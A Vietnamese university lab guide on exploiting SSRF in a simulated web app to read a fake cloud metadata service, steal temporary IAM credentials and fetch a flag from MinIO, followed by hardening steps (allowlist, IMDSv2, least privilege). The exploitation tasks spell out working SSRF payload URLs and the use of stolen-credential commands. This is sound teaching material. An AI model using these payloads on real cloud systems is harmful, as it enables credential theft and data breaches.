# Học viện Công nghệ Bưu chính Viễn thông - SecLab PTIT
## HƯỚNG DẪN THỰC HÀNH

# Khai thác SSRF để đánh cắp Cloud Credential qua Metadata Service (IMDS)

**Mức độ:** Nâng cao  **|**  **Phân loại:** Cloud Security / DevSecOps  **|**  **Ánh xạ khung:** OWASP Top 10 A10:2021 (SSRF) · MITRE ATT&CK T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)

---

## 1. Giới thiệu lab

| Thông tin | Chi tiết |
|---|---|
| **Tên Lab** | `cloud-ssrf-imds` |
| **Mức độ** | Nâng cao |
| **Công cụ sử dụng** | `curl`, ứng dụng web mục tiêu (chức năng "fetch URL"/preview ảnh), `aws-cli` (v2), `jq` |
| **Kiến thức yêu cầu** | Hiểu cơ bản về HTTP request/response và tham số URL; biết dùng terminal Linux và `curl`; khái niệm cơ bản về dịch vụ đám mây (IAM role, object storage kiểu S3). Tất cả khái niệm cốt lõi được nhắc lại trong mục 3 nên **không yêu cầu đã làm bài lab nào trước đó**. |

**Mục tiêu học tập**
- Hiểu bản chất lỗ hổng **SSRF (Server-Side Request Forgery)** và vì sao nó đặc biệt nguy hiểm trong môi trường đám mây.
- Nắm được vai trò của dịch vụ **Instance Metadata Service (IMDS)** tại địa chỉ link-local `169.254.169.254` và cơ chế cấp **credential tạm thời** cho IAM role gắn với máy chủ.
- Hiểu chuỗi tấn công điển hình của sự cố **Capital One (2019)**: SSRF → IMDS → credential tạm thời → truy cập trái phép object storage.
- Nắm nguyên tắc phòng thủ nhiều lớp: chống SSRF (allowlist, chặn IP nội bộ/link-local), **IMDSv2** (yêu cầu token qua PUT, giới hạn hop limit), và **least privilege** cho IAM role.
- Ánh xạ kỹ thuật khai thác vào OWASP A10 và MITRE ATT&CK T1552.005.

**Kỹ năng đạt được**
- Kỹ năng phát hiện và xác nhận (verify) một điểm SSRF trong chức năng "fetch URL" của ứng dụng web.
- Kỹ năng lợi dụng SSRF để pivot tới các dịch vụ chỉ nghe trên mạng nội bộ mà attacker không truy cập trực tiếp được.
- Kỹ năng trích xuất và sử dụng credential tạm thời (AccessKey/SecretKey/SessionToken) để thao tác với object storage tương thích S3 bằng `aws-cli`.
- Kỹ năng viết hardening chống SSRF (validate & allowlist URL, chặn dải link-local/metadata) và cấu hình phòng thủ tầng metadata (IMDSv2, hop limit).
- Kỹ năng đánh giá rủi ro theo tư duy DevSecOps: tìm nguyên nhân gốc rễ và đề xuất phòng thủ theo chiều sâu.

---

## 2. Kịch bản

**Tình huống:**
Một công ty tài chính vận hành ứng dụng web `imgproxy-portal` cho phép người dùng dán một URL ảnh để hệ thống tải về và tạo bản xem trước (preview). Ứng dụng này chạy trên một "máy chủ đám mây" được gắn một IAM role có quyền đọc/ghi trên một bucket object storage nội bộ. Do chức năng "fetch URL" không kiểm tra đích đến, ứng dụng có thể bị ép gửi request tới bất kỳ địa chỉ nội bộ nào — bao gồm cả dịch vụ metadata của đám mây.

Sinh viên đóng vai **attacker** đã tiếp cận được giao diện ứng dụng web (qua máy `client`), nhưng **không** có quyền truy cập trực tiếp tới dịch vụ metadata hay object storage nội bộ. Mục tiêu là khai thác SSRF để buộc chính máy chủ web gọi tới IMDS giả, đọc credential tạm thời của IAM role, rồi dùng credential đó để truy cập bucket và lấy **flag**.

> **Lưu ý mô phỏng offline:** Toàn bộ lab chạy cục bộ trong Labtainer, **KHÔNG có cloud thật**. Dịch vụ IMDS `169.254.169.254` được **giả lập** bằng một HTTP server phục vụ các đường dẫn kiểu `/latest/meta-data/...` và trả về credential **giả** do lab sinh ra. Object storage đích được mô phỏng bằng **MinIO** (tương thích S3). Mọi khóa/token đều là dữ liệu giả dùng cho mục đích học tập.

**Vai trò của sinh viên:**
1. Trên máy `client`, khảo sát chức năng "fetch URL" của ứng dụng web mục tiêu và **phát hiện SSRF**.
2. Dùng SSRF để ép máy chủ web truy vấn IMDS giả, liệt kê IAM role và đọc credential tạm thời (AccessKey/SecretKey/Token).
3. Cấu hình `aws-cli` với credential vừa lấy, trỏ `--endpoint-url` tới object storage mô phỏng, liệt kê bucket và **tải về flag**.
4. Thực hiện **hardening**: đề xuất và mô tả biện pháp chống SSRF, IMDSv2, least privilege; xác minh biện pháp chống link-local hoạt động.

**Sơ đồ mạng (mô tả text):**

```
                     Mạng ảo Labtainer 172.25.0.0/24
  +--------------------------------------------------------------------+
  |                                                                    |
  |   [client]  172.25.0.10                                            |
  |   Attacker: curl, aws-cli, jq                                      |
  |      |                                                             |
  |      | (1) HTTP tới chức năng "fetch URL"                          |
  |      v                                                             |
  |   [webapp]  172.25.0.20  (cổng 8080)                               |
  |   Ứng dụng "imgproxy-portal" DÍNH SSRF                             |
  |   Được gắn IAM role: web-imgproxy-role                             |
  |      |                          |                                  |
  |      | (2) SSRF ép server gọi   | (4) dùng credential truy cập    |
  |      |     tới IMDS giả         |     object storage              |
  |      v                          v                                  |
  |   [imds] 169.254.169.254     [storage] 172.25.0.30 (cổng 9000)     |
  |   Metadata giả               MinIO (S3-compatible)                 |
  |   /latest/meta-data/...      bucket: fin-reports (chứa flag)       |
  |   trả credential tạm thời                                          |
  |                                                                    |
  +--------------------------------------------------------------------+

  Luồng tấn công:  client --SSRF--> webapp --(gọi hộ)--> imds
                   client lấy credential từ phản hồi webapp
                   client --aws-cli + credential--> storage --> FLAG

  Ghi chú: [imds] và [storage] KHÔNG cho client truy cập trực tiếp
           theo kịch bản; client chỉ tương tác được qua webapp.
           (Xem mục "Ghi chú triển khai" về cách mô phỏng 169.254.169.254.)
```

---

## 3. Kiến thức bổ trợ

**Kiến thức nền tảng**

- **SSRF (Server-Side Request Forgery) — OWASP A10:2021:** lỗ hổng khi ứng dụng nhận một URL/đường dẫn từ người dùng và **tự mình** gửi request tới đó mà không kiểm soát đích. Kẻ tấn công lợi dụng để buộc server gọi tới tài nguyên nội bộ (localhost, mạng riêng, dịch vụ metadata) mà bản thân họ không tiếp cận được từ bên ngoài. Server trở thành "proxy" tin cậy trong mạng nội bộ.

- **Instance Metadata Service (IMDS):** dịch vụ đặc biệt trên các nền tảng đám mây, truy cập được từ *bên trong* máy ảo qua địa chỉ **link-local `169.254.169.254`**. Nó cung cấp metadata về máy (region, hostname, network...) và — quan trọng nhất về an ninh — **credential tạm thời của IAM role** gắn với máy tại đường dẫn `/latest/meta-data/iam/security-credentials/<tên-role>`. Bất kỳ tiến trình nào chạy trên máy (kể cả một ứng dụng bị SSRF) đều có thể đọc được credential này.

- **IAM role & credential tạm thời:** thay vì nhúng khóa cứng vào ứng dụng, đám mây cấp cho máy một *role* và IMDS phát hành khóa tạm thời gồm `AccessKeyId`, `SecretAccessKey`, `Token` (session token) có thời hạn. Ai lấy được bộ ba này sẽ mạo danh được role trong thời gian token còn hiệu lực.

- **IMDSv1 vs IMDSv2:** IMDSv1 trả credential chỉ với một request `GET` đơn giản → rất dễ bị SSRF khai thác. **IMDSv2** yêu cầu quy trình 2 bước: gửi `PUT` để lấy **session token**, rồi mọi request `GET` phải kèm header token đó; đồng thời áp **hop limit** (thường = 1) để gói tin có TTL nhỏ không đi qua proxy/chuyển tiếp. Điều này khiến phần lớn SSRF cổ điển (chỉ làm được GET) thất bại.

- **Object storage tương thích S3 (MinIO):** dịch vụ lưu trữ đối tượng theo mô hình *bucket/object*, dùng chung giao thức và cú pháp với Amazon S3. `aws-cli` có thể thao tác với MinIO bằng tham số `--endpoint-url` trỏ tới địa chỉ MinIO cục bộ.

- **Sự cố Capital One (2019):** minh họa kinh điển cho chuỗi này — một WAF/ứng dụng dính SSRF bị ép gọi IMDS, kẻ tấn công lấy credential tạm thời của role rồi đọc dữ liệu hàng trăm triệu khách hàng trên S3. Nguyên nhân gốc: SSRF + IMDSv1 + role quyền quá rộng.

- **Least privilege:** nguyên tắc chỉ cấp cho role đúng quyền tối thiểu cần thiết. Nếu role của ứng dụng preview ảnh chỉ cần đọc một bucket cụ thể, việc gán quyền rộng (đọc/ghi mọi bucket) sẽ biến một SSRF thành thảm họa dữ liệu.

**Thành phần cần quan sát trong bài lab**

| Thành phần | Vai trò |
|---|---|
| Chức năng "fetch URL" của `webapp` | Điểm nhập tham số URL do người dùng kiểm soát; là bề mặt tấn công SSRF. |
| Địa chỉ `169.254.169.254` (IMDS giả) | Đích SSRF quan trọng; phục vụ metadata và credential tạm thời của role. |
| Đường dẫn `/latest/meta-data/iam/security-credentials/` | Liệt kê tên IAM role gắn với máy; nối thêm tên role sẽ trả về credential JSON. |
| Bộ credential tạm thời (AccessKeyId/SecretAccessKey/Token) | "Chìa khóa" tạm thời để mạo danh role truy cập object storage. |
| Bucket `fin-reports` trên `storage` (MinIO) | Tài nguyên đích; chứa đối tượng `flag.txt`. |
| `flag.txt` | Tập tin chứa flag, chỉ đọc được sau khi dùng credential đánh cắp truy cập bucket. |

**Bảng công cụ & cú pháp**

| Công cụ | Tùy chọn / Cú pháp | Mô tả tác dụng |
|---|---|---|
| `curl` | `curl -s "http://<webapp>:8080/fetch?url=<URL_ĐÍCH>"` | Gửi request tới chức năng fetch URL; đặt `<URL_ĐÍCH>` là địa chỉ nội bộ để kiểm tra/khai thác SSRF. |
| `curl` | `curl -s "http://<webapp>:8080/fetch?url=http://169.254.169.254/latest/meta-data/"` | Ép server đi qua SSRF để truy vấn IMDS giả (khai thác chính). |
| `curl` | `curl -s ... \| jq .` | Kết hợp với `jq` để định dạng/parse phản hồi JSON credential. |
| `jq` | `jq -r '.AccessKeyId, .SecretAccessKey, .Token'` | Trích riêng từng trường credential từ JSON để cấu hình aws-cli. |
| `aws-cli` | `aws configure set aws_access_key_id <AK>` … | Nạp credential tạm thời vào profile để dùng cho các lệnh sau. |
| `aws-cli` | `export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...` | Cách nhanh: đặt credential (kèm session token) qua biến môi trường. |
| `aws-cli` | `aws --endpoint-url http://<storage>:9000 s3 ls` | Liệt kê bucket trên object storage mô phỏng (MinIO). |
| `aws-cli` | `aws --endpoint-url http://<storage>:9000 s3 cp s3://<bucket>/<key> <local>` | Tải một đối tượng (ví dụ `flag.txt`) từ bucket về máy. |

---

## 4. Các nhiệm vụ của bài thực hành

Để tải bài thực hành, sinh viên thực hiện câu lệnh:

```bash
imodule https://github.com/ptit2026/pen_lab_2026/raw/refs/heads/main/cloud-ssrf-imds.tar
```

Để khởi động bài thực hành, sinh viên dùng câu lệnh:

```bash
labtainer cloud-ssrf-imds
```

> Chú ý: sinh viên sử dụng mã sinh viên của mình để nhập thông tin email người thực hiện bài lab khi có yêu cầu, để sử dụng khi chấm điểm.

Sau khi khởi động xong, một terminal ảo sẽ xuất hiện, đại diện cho máy tấn công: `client`. Trong các lệnh dưới đây, thay `<webapp>` bằng IP của container ứng dụng web (mặc định `172.25.0.20`) và `<storage>` bằng IP của object storage (mặc định `172.25.0.30`).

---

### Nhiệm vụ 1 — `discover_ssrf`: Phát hiện và xác nhận lỗ hổng SSRF

**Mục tiêu:** Khảo sát chức năng "fetch URL" của ứng dụng web và chứng minh rằng server có thể bị ép gửi request tới đích do attacker chỉ định (bao gồm cả tài nguyên nội bộ mà `client` không truy cập trực tiếp được).

**Bước 1:** Xem trang chính để hiểu chức năng fetch/preview:
```bash
curl -s "http://<webapp>:8080/" | head -n 40
```

**Bước 2:** Gọi thử chức năng fetch với một URL hợp lệ để quan sát hành vi "server tải hộ":
```bash
curl -s "http://<webapp>:8080/fetch?url=http://<webapp>:8080/health"
```

**Bước 3:** Xác nhận SSRF hướng nội bộ — ép server tự gọi tới `localhost`/loopback của chính nó (đích mà `client` không thể gọi thay được):
```bash
curl -s "http://<webapp>:8080/fetch?url=http://127.0.0.1:8080/health"
```

**Bước 4:** Thử trỏ tới địa chỉ dịch vụ metadata để kiểm tra khả năng pivot (phản hồi khác rỗng/khác lỗi DNS là dấu hiệu SSRF chạm được IMDS):
```bash
curl -s "http://<webapp>:8080/fetch?url=http://169.254.169.254/latest/meta-data/"
```

**Điều kiện hoàn thành nhiệm vụ:** Request qua tham số `url` tới đích nội bộ (loopback của webapp và/hoặc `169.254.169.254`) trả về nội dung hợp lệ do *server* lấy hộ, chứng minh chức năng fetch bị SSRF. (Chấm tự động: bash history/log của webapp ghi nhận request outbound tới `169.254.169.254` xuất phát từ chức năng fetch.)

**Câu hỏi 1:** Vì sao việc server "tải hộ" một URL nội bộ (ví dụ `127.0.0.1` hay `169.254.169.254`) lại nguy hiểm hơn nhiều so với việc chính attacker tự gọi các địa chỉ đó từ máy `client`?
Trả lời: _______________________________________

---

### Nhiệm vụ 2 — `steal_credentials`: Khai thác SSRF để đọc IMDS và đánh cắp credential tạm thời

**Mục tiêu:** Dùng SSRF làm cầu nối tới IMDS giả, liệt kê IAM role gắn với máy chủ web và trích xuất bộ credential tạm thời của role đó.

**Bước 1:** Liệt kê danh mục metadata gốc để xác nhận cấu trúc IMDS:
```bash
curl -s "http://<webapp>:8080/fetch?url=http://169.254.169.254/latest/meta-data/"
```

**Bước 2:** Truy vấn danh sách IAM role gắn với instance (đường dẫn này trả về *tên role*):
```bash
curl -s "http://<webapp>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```
Ghi lại tên role thu được (ví dụ: `web-imgproxy-role`).

**Bước 3:** Nối tên role vào đường dẫn để lấy credential tạm thời dạng JSON:
```bash
curl -s "http://<webapp>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<TÊN_ROLE>"
```

**Bước 4:** Parse JSON để tách các trường credential (lưu ý: phản hồi có thể được webapp bọc thêm; dùng `jq` hoặc `grep` để lọc):
```bash
curl -s "http://<webapp>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<TÊN_ROLE>" | jq .
```
Xác định 3 trường: `AccessKeyId`, `SecretAccessKey`, `Token`.

**Điều kiện hoàn thành nhiệm vụ:** Trích xuất thành công bộ credential tạm thời (đủ 3 trường `AccessKeyId`, `SecretAccessKey`, `Token`) của IAM role qua kênh SSRF → IMDS. (Chấm tự động: giá trị `AccessKeyId` giả do lab sinh xuất hiện trong output/lệnh của `client`.)

**Câu hỏi 2:** Kỹ thuật này ánh xạ tới MITRE ATT&CK **T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)**. Vì sao credential lấy từ IMDS được coi là "credential tạm thời" và điều đó ảnh hưởng thế nào tới cách attacker phải hành động sau khi đánh cắp?
Trả lời: _______________________________________

---

### Nhiệm vụ 3 — `access_storage_get_flag`: Dùng credential đánh cắp để truy cập object storage và lấy flag

**Mục tiêu:** Cấu hình `aws-cli` bằng credential tạm thời vừa lấy, trỏ tới object storage mô phỏng (MinIO), liệt kê bucket và tải về `flag.txt`.

**Bước 1:** Nạp credential (bao gồm cả session token) qua biến môi trường:
```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>
export AWS_DEFAULT_REGION=us-east-1
```

**Bước 2:** Liệt kê các bucket mà role có quyền nhìn thấy trên object storage mô phỏng:
```bash
aws --endpoint-url http://<storage>:9000 s3 ls
```

**Bước 3:** Liệt kê nội dung bucket mục tiêu để tìm tập tin flag:
```bash
aws --endpoint-url http://<storage>:9000 s3 ls s3://fin-reports/
```

**Bước 4:** Tải về `flag.txt` và đọc nội dung:
```bash
aws --endpoint-url http://<storage>:9000 s3 cp s3://fin-reports/flag.txt ./flag.txt
cat ./flag.txt
```

**Điều kiện hoàn thành nhiệm vụ:** Dùng credential đánh cắp truy cập được bucket `fin-reports` và tải về `flag.txt`; nội dung tập tin chứa chuỗi flag đúng định dạng của bài. (Chấm tự động: chuỗi flag xuất hiện trong file `flag.txt`/output trên `client`.)

**Câu hỏi 3:** Trình bày lại toàn bộ chuỗi khai thác từ Nhiệm vụ 1 đến đây (SSRF → IMDS → credential → storage). So sánh với sự cố Capital One 2019: điểm tương đồng cốt lõi là gì?
Trả lời: _______________________________________

---

### Nhiệm vụ 4 — `harden_ssrf_imds`: Phòng thủ nhiều lớp (chống SSRF, IMDSv2, least privilege)

**Mục tiêu:** Áp dụng tư duy DevSecOps để bịt lỗ hổng theo chiều sâu. Sinh viên chỉnh cấu hình chống SSRF cho ứng dụng, chuyển tầng metadata sang chế độ yêu cầu token (IMDSv2), và mô tả least privilege cho role; sau đó xác minh biện pháp có hiệu lực.

**Bước 1 — Chống SSRF ở tầng ứng dụng (allowlist + chặn IP nội bộ):** Mở file cấu hình của webapp và bật cơ chế lọc URL (đường dẫn cấu hình sẽ được lab chỉ ra, ví dụ `/opt/webapp/config.yaml`). Yêu cầu:
- Chỉ cho phép scheme `http/https` và **allowlist** danh sách host được phép fetch.
- **Từ chối** mọi đích phân giải ra dải nội bộ/link-local: `127.0.0.0/8`, `169.254.0.0/16` (đặc biệt `169.254.169.254`), `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`.
```bash
# Ví dụ bật cờ trong cấu hình (minh họa, cú pháp thực tế theo hướng dẫn trong lab):
ssrf_protection: true
allow_hosts: ["images.trusted.example"]
deny_cidrs: ["127.0.0.0/8","169.254.0.0/16","10.0.0.0/8","172.16.0.0/12","192.168.0.0/16"]
```
Khởi động lại dịch vụ webapp theo hướng dẫn trong lab (ví dụ `sudo systemctl restart webapp` hoặc script `restart_webapp.sh`).

**Bước 2 — Xác minh SSRF đã bị chặn:** Lặp lại request khai thác của Nhiệm vụ 2; giờ đây server phải từ chối (ví dụ trả về lỗi 403/"blocked host"):
```bash
curl -s "http://<webapp>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Bước 3 — Bật IMDSv2 (yêu cầu token qua PUT, hop limit = 1):** Đặt IMDS giả sang chế độ chỉ trả dữ liệu khi có session token. Kiểm chứng rằng một request `GET` "trần" (kiểu SSRF cổ điển) bị từ chối, còn quy trình đúng cần 2 bước PUT→GET:
```bash
# GET trần: bị từ chối (401/không có token)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Quy trình IMDSv2 hợp lệ (thực hiện từ chính máy có role):
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Bước 4 — Least privilege (mô tả & ghi nhận):** Viết vào file `remediation.txt` trên `client` phần trả lời ngắn: role `web-imgproxy-role` nên được thu hẹp quyền tối thiểu nào để dù bị lộ credential thì thiệt hại vẫn hạn chế (ví dụ: chỉ `s3:GetObject` trên đúng prefix cần thiết, không cấp quyền list/ghi toàn bộ bucket).
```bash
cat > remediation.txt <<'EOF'
1. Chống SSRF: allowlist host + chặn CIDR nội bộ/link-local (169.254.169.254).
2. IMDSv2: bắt buộc token PUT, hop limit = 1.
3. Least privilege: role chỉ s3:GetObject trên prefix cụ thể, không list/ghi toàn bucket.
EOF
```

**Điều kiện hoàn thành nhiệm vụ:** (a) Sau khi bật chống SSRF, request khai thác tới `169.254.169.254` qua webapp bị từ chối (không còn trả về credential); (b) IMDS giả từ chối `GET` trần và chỉ trả dữ liệu khi có token IMDSv2; (c) tồn tại file `remediation.txt` nêu đủ 3 lớp phòng thủ. (Chấm tự động: request SSRF sau hardening trả về mã chặn/không chứa `AccessKeyId`; file `remediation.txt` chứa các từ khóa allowlist/IMDSv2/least privilege.)

**Câu hỏi 4:** Trong ba biện pháp trên, nếu chỉ được chọn triển khai **một** để giảm rủi ro tức thời cho chuỗi tấn công này, sinh viên chọn biện pháp nào và vì sao? Biện pháp nào là "phòng thủ theo chiều sâu" bổ trợ khi biện pháp kia thất bại?
Trả lời: _______________________________________

---

## 5. Ghi chú triển khai (cho người xây lab)

**Các container cần dựng (khai báo trong `start.config`, mạng ảo ví dụ `172.25.0.0/24`):**

| Container | IP (gợi ý) | Vai trò & dịch vụ |
|---|---|---|
| `client` | `172.25.0.10` | Máy attacker; cài `curl`, `awscli` (v2), `jq`. Nơi sinh viên gõ lệnh, thu artifacts để chấm. |
| `webapp` | `172.25.0.20` | Ứng dụng "imgproxy-portal" nghe cổng 8080, có endpoint `/fetch?url=` **cố ý dính SSRF** (server thực hiện outbound request theo URL người dùng, không validate). Được cấu hình để "biết" role `web-imgproxy-role`. Có công tắc hardening (`ssrf_protection`, allowlist, deny_cidrs) tắt mặc định. |
| `imds` | Bí danh `169.254.169.254` | HTTP server giả phục vụ `/latest/meta-data/...`. Mặc định IMDSv1 (GET trần trả credential). Có chế độ IMDSv2 (PUT lấy token, header token cho GET) bật ở Nhiệm vụ 4. |
| `storage` | `172.25.0.30` | MinIO (S3-compatible) nghe cổng 9000, tạo sẵn bucket `fin-reports` chứa `flag.txt`. Cấu hình chấp nhận credential tạm thời giả do `imds` phát hành. |

**Điểm cần lưu ý khi mô phỏng `169.254.169.254`:**
- Địa chỉ link-local `169.254.169.254` cần được gán như một alias/route để container `webapp` gọi tới được (và, theo kịch bản, `client` KHÔNG được truy cập trực tiếp — có thể hạn chế bằng firewall rule nội bộ hoặc không route từ `client`). Nếu Labtainer khó gán đúng `169.254.169.254`, dùng một IP nội bộ mô phỏng (ví dụ `172.25.0.254`) và ghi rõ trong đề cho sinh viên; giữ nguyên đường dẫn `/latest/meta-data/...` để bám sát thực tế.
- IMDS giả sinh credential tạm thời **giả** (parametrize theo mã sinh viên để mỗi người một bộ khóa/flag khác nhau). Trường `Token`/`Expiration` chỉ mang tính hình thức.

**Flag/goal dự kiến (chấm tự động qua artifacts + goals):**
- `discover_ssrf`: phát hiện outbound request tới IMDS từ chức năng fetch (log webapp / history client).
- `steal_credentials`: chuỗi `AccessKeyId` giả xuất hiện trong output của `client`.
- `access_storage_get_flag`: chuỗi flag (tham số hóa theo mã SV) trong `flag.txt`.
- `harden_ssrf_imds`: request SSRF sau hardening không còn trả `AccessKeyId`; IMDS từ chối GET trần; `remediation.txt` chứa từ khóa `allowlist`/`IMDSv2`/`least privilege`.

**Lưu ý tài nguyên:** MinIO tương đối nhẹ, phù hợp 1 VM Labtainer. `awscli v2` cài offline cần đóng gói sẵn trong image `client` (bundle) để tránh phụ thuộc mạng. Endpoint SSRF cần bật CORS/redirect-following tối thiểu để mô phỏng đúng hành vi "server tải hộ"; cân nhắc chặn `client` truy cập thẳng `imds`/`storage` để buộc sinh viên đi đúng luồng khai thác.

**Ánh xạ khung tham chiếu:** OWASP Top 10 A10:2021 (SSRF); MITRE ATT&CK T1552.005 (Unsecured Credentials: Cloud Instance Metadata API); tham chiếu thực tế: sự cố Capital One 2019.
